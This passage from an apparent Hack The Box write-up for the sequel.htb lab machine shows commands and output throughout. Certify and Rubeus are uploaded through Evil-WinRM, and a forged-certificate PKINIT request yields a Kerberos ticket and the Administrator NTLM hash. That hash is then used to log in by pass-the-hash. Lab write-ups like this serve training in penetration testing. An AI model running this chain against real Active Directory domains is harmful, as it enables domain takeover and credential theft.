*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload /home/th3g3ntl3m4n/htb/machines/images/Rubeus.exe 
Info: Uploading /home/th3g3ntl3m4n/htb/machines/images/Rubeus.exe to C:\Users\Ryan.Cooper\Documents\Rubeus.exe

                                                             
Data: 595968 bytes of 595968 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> dir

    Directory: C:\Users\Ryan.Cooper\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/2/2023  11:22 PM         174080 Certify.exe
-a----         5/2/2023  11:39 PM         446976 Rubeus.exe

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload /home/th3g3ntl3m4n/htb/machines/images/exploitation/privesc/cert.pfx
Info: Uploading /home/th3g3ntl3m4n/htb/machines/images/exploitation/privesc/cert.pfx to C:\Users\Ryan.Cooper\Documents\cert.pfx

                                                             
Data: 4564 bytes of 4564 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> dir

    Directory: C:\Users\Ryan.Cooper\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/2/2023  11:42 PM           3425 cert.pfx
-a----         5/2/2023  11:22 PM         174080 Certify.exe
-a----         5/2/2023  11:39 PM         446976 Rubeus.exe
```

Now we ran the Rubeus tool.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt /nowrap /getcredentials                                                                       
                                                                                                                                                                                                                 
   ______        _                                                                                                                                                                                               
  (_____ \      | |                                                                                                                                                                                              
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::35fb:821:bad7:3cee%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  5/2/2023 11:58:27 PM
  EndTime                  :  5/3/2023 9:58:27 AM
  RenewTill                :  5/9/2023 11:58:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  hZEKxYPyMK8YcByogANYGA==
  ASREP (key)              :  3302AB65D206285F7E378EAC235A692A

[*] Getting credentials using U2U
CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

We were able to get the NTLM hash from the user Administrator. Now log into the machine using `evil-winrm` tool e passing `-H` flag for authentication using the hash.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/images/exploitation/privesc]
╰─ $ evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

![Untitled](images/Untitled%207.png)

Or we can use psexec tool from impacket too.

![Untitled](images/Untitled%208.png)